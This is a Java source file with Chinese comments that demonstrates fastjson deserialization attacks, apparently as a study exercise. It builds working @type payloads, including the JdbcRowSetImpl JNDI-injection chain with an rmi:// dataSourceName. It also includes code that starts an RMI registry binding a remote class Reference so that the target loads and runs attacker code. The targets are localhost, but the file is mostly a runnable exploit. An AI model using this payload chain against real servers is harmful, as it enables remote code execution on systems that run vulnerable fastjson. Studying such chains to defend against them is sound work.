package fastJsonHack;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;

/**
 * 两条链：JNDI + RMI 和 JNDI + LDAP
 */
public class fastJsonHack {

    /**
     * fastjson 反序列化，相比 jdk 原生反序列化
     * 1. 不需要实现 serializable 接口
     * 2. 变量不需要不是 transient -> 变量有对应的 getter/setter 就行 || 满足条件的 getter -> 变量可控
     * 3. 入口是 getter/setter，不是 readObject
     *
     * 相同点：sink 反射/动态类加载
     *
     */
    public static void main(String[] args) {
        // hack_v0();

        hack_v1();
    }


    /**
     * 最朴素的攻击方法：
     * 在 set 函数中加入恶意类、危险方法，加载该类的时候会调用 setter，触发 RCE
     */
    public static void hack_v0() {
        String s = "{\"@type\": \"fastJsonHack.hackerClass\", \"cmd\": \"cmd\"}";
        JSONObject jsonObject = JSON.parseObject(s);
        System.out.println(jsonObject);
    }

    /**
     * 可以用的现实中的攻击链 -> jdbcRowSetImpl 存在 JNDI 注入
     *  InitialContext() + lookup() ---> 标准的 JNDI 注入
     *
     *  RMI 版本
     *
     * jdbcRowSetImpl.setAutoCommit()
     * 直接有 set 可以用 还有个 getDatabaseMetaData 需要调用 JSON.toJSON() 才能调 getter，约束容易不满足
     *      -> jdbcRowSetImpl.connect()
     *          -> (DataSource)ctx.lookup((getDataSourceName())
     *              -> getDataSourceName() -> return dataSource 是否用户可控？ -> javaBeanInfo 中满足三个条件
     */
    public static void hack_v1() {
        // 使用 dataSourceName，因为 getter 和 setter 都以这个命名
        // fastJson 只以 getter 和 setter 为准，和 field 名无关

        // 启动 RMI 服务器
        // StartRMIServer();

        String s = "{" +
                "\"@type\": \"com.sun.rowset.JdbcRowSetImpl\"," +
                " \"dataSourceName\": \"rmi://localhost:2222/hackerClass\"," +
                " \"autoCommit\": true" +
                "}";
        JSONObject jsonObject = JSON.parseObject(s);
        System.out.println(jsonObject);
    }

    private static void StartRMIServer() {
        Thread rmiThread = new Thread(() -> {
            try {
                InitialContext initialContext = new InitialContext();

                // 启动 RMI 注册表
                LocateRegistry.createRegistry(2222);
                System.out.println("RMI Registry start on port 2222");

                // 创建远程对象实例
                Reference SakanaRemoteReference = new Reference("hackerClass", "hackerClass", "http://localhost:1111");
                initialContext.bind("rmi://localhost:2222/TouchFile", SakanaRemoteReference);
            } catch (RemoteException e) {
                throw new RuntimeException(e);
            } catch (NamingException e) {
                throw new RuntimeException(e);
            }
        });

        rmiThread.start();

        System.out.println("start RMI service succeed!");
    }
}
